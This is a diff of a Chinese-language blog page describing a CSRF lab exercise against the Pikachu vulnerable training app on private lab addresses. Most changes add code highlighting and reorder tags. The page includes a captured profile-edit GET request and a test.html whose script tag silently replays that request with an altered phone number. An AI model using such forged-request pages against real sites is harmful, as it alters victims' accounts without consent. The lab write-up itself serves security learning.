@@ -30,6 +30,8 @@
 
     <title>CSRF实验 | Hkini</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
+    <link rel="stylesheet" type="text/css" href="/libs/prism/prism.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcdn.net/ajax/libs/prism/1.9.0/plugins/line-numbers/prism-line-numbers.css">
     
 
 
@@ -920,9 +922,7 @@
 <ul>
 <li><p>点击submit，然后抓包查看头部信息</p>
 <p>可见请求信息为</p>
-<pre><code class="txet">http://192.168.61.145:88/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=123567898&amp;add=nba+lakes&amp;email=nihao%40pikachu.com&amp;submit=submit
-</code></pre>
-</li>
+<pre class="line-numbers language-txet" data-language="txet"><code class="language-txet">http://192.168.61.145:88/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=123567898&amp;add=nba+lakes&amp;email=nihao%40pikachu.com&amp;submit=submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232751.png" style="zoom:50%;">
 
@@ -932,9 +932,9 @@
 <li>在win7(192.168.61.146)中设计一个含有同样请求（修改数据：手机号为11111111）的网站。</li>
 </ul>
 <p>test.html</p>
-<pre><code class="html">&lt;script src='http://192.168.61.145:88/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=11111111&amp;add=nba+lakes&amp;email=nihao%40pikachu.com&amp;submit=submit'&gt;&lt;/script&gt;
-&lt;p&gt;hello word&lt;/p&gt;
-</code></pre>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://192.168.61.145:88/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=11111111&amp;add=nba+lakes&amp;email=nihao%40pikachu.com&amp;submit=submit<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>hello word<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <ul>
 <li><p>在win2008中模拟访问该网站实现跨站请求</p>
 <p>通过检查发现，发现该网站发送了一个数据包，其结构与我们在pikachu修改时抓包一样，只是修改了手机号。</p>
@@ -1449,12 +1449,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">
-                        <span class="chip bg-color">年度总结</span>
-                    </a>
-                    
                     <a href="/tags/%E7%BC%96%E7%A8%8B/">
                         <span class="chip bg-color">编程</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">
+                        <span class="chip bg-color">年度总结</span>
                     </a>
                     
                 </div>
